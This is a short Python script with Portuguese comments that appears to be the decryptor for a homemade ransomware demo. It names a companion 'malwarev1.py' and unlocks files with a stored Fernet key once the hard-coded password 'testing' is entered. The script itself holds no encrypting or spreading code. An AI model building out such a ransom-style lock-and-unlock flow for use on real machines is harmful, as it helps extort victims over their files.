import os
from cryptography.fernet import Fernet

def decrypt_files(files, secret_key):
    # Cria uma pasta de destino para salvar os arquivos descriptografados
    os.makedirs("decrypted_files", exist_ok=True)
    
    # Descriptografa cada arquivo e salva o conteúdo de volta no arquivo
    for file in files:
        with open(file, "rb") as file_to_decrypt:
            content = file_to_decrypt.read()
        
        decrypted_content = Fernet(secret_key).decrypt(content)
        
        decrypted_file_path = os.path.join("decrypted_files", file)
        
        with open(decrypted_file_path, "wb") as decrypted_file:
            decrypted_file.write(decrypted_content)

    print("All files have been decrypted.")
    print("Decrypted files are saved in the 'decrypted_files' directory.")

def main():
    # Lista de arquivos a serem descriptografados
    files = [
        file for file in os.listdir()
        if os.path.isfile(file) and file not in ["malwarev1.py", "scrapySimples.py", "chave.key", "decrypt.py"]
    ]
    
    print("Files to be decrypted:", files)
    
    key_file_path = "chave.key"
    
    # Verifica se o arquivo da chave secreta existe
    if not os.path.exists(key_file_path):
        print("Secret key file 'chave.key' not found.")
        return
    
    # Lê a chave secreta
    with open(key_file_path, "rb") as key_file:
        secret_key = key_file.read()
    
    password = input("Enter the password to decrypt your files: ")
    
    if password == "testing":
        # Verifica se há arquivos a serem descriptografados
        if not files:
            print("No files to decrypt.")
        else:
            decrypt_files(files, secret_key)
    else:
        print("Enter the correct password to decrypt your files!")

if __name__ == "__main__":
    main()